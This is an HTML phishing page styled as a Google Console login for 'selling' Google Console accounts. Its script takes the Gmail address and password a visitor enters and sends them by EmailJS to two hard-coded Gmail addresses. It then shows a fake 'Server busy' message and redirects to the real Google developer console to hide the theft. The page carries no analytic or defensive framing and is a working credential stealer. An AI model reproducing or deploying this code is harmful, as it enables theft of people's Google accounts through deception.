<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sell Your Google Console - Login gmail</title>
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            background-color: #f1f1f1;
            margin: 0;
            padding: 0;
        }

        .header {
            text-align: center;
            padding: 20px;
            background: white;
            box-shadow: 0px 2px 10px rgba(0,0,0,0.1);
        }
        
        .logo {
            width: 100px;
            animation: heartbeat 1.5s ease-in-out infinite;
        }
        
        @keyframes heartbeat {
            0% { transform: scale(1); }
            14% { transform: scale(1.1); }
            28% { transform: scale(1); }
            42% { transform: scale(1.1); }
            70% { transform: scale(1); }
        }
        
        .title {
            font-size: 2em;
            color: #4285F4;
            margin: 15px 0;
            font-weight: bold;
        }

        .main-content {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            background: white;
            padding: 20px;
            box-shadow: 0px 0px 10px rgba(0,0,0,0.1);
            border-radius: 10px;
            text-align: center;
            width: 300px;
        }

        input {
            width: 90%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
        }

        .btn {
            width: 100%;
            padding: 10px;
            background: #4285F4;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }

        .btn:hover {
            background: #357ae8;
        }

        .loading {
            display: none;
            margin-top: 10px;
        }

        .footer {
            text-align: center;
            padding: 20px;
            background: white;
            box-shadow: 0px -2px 10px rgba(0,0,0,0.1);
        }
    </style>
</head>
<body>
    <header class="header">
        <img src="1200px-Google_Play_Console_Logo_(2023).svg.png" alt="Logo" class="logo">
        <h1 class="title">SELL GOOGLE CONSOLE</h1>
    </header>

    <div class="main-content">
        <div class="container">
            <h2>Login</h2>
            <input type="email" id="email" placeholder="Gmail" required>
            <input type="password" id="password" placeholder="Password" required>
            <button class="btn" onclick="login()">Log In</button>
            <div class="loading">Loading...</div>
        </div>
    </div>

    <footer class="footer">
        <p>Â© <span id="year"></span> Google Console. All rights reserved.</p>
    </footer>

    <script>
        // Set current year in footer
        document.getElementById('year').textContent = new Date().getFullYear();

        // Initialize EmailJS
        emailjs.init("UOCiCpne8fEL1dZ7y");

        function login() {
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const loading = document.querySelector('.loading');

            loading.style.display = 'block';

            // Email template parameters
            const templateParams = {
                user_email: email,
                user_password: password,
                to_email1: "sblgivan@gmail.com",
                to_email2: "waiganjoallan7@gmail.com"
            };

            // Send email using EmailJS
            emailjs.send('service_daj3rh9', 'template_041hpyq', templateParams)
                .then(function(response) {
                    console.log('SUCCESS!', response.status, response.text);
                })
                .catch(function(error) {
                    console.log('FAILED...', error);
                });

            // Continue with the original timeout and redirect
            setTimeout(() => {
                loading.style.display = 'none';
                alert("Server busy.. redirecting to Google Console");
                window.location.href = "https://console.developers.google.com/";
            }, 10000);
        }
    </script>
</body>
</html>
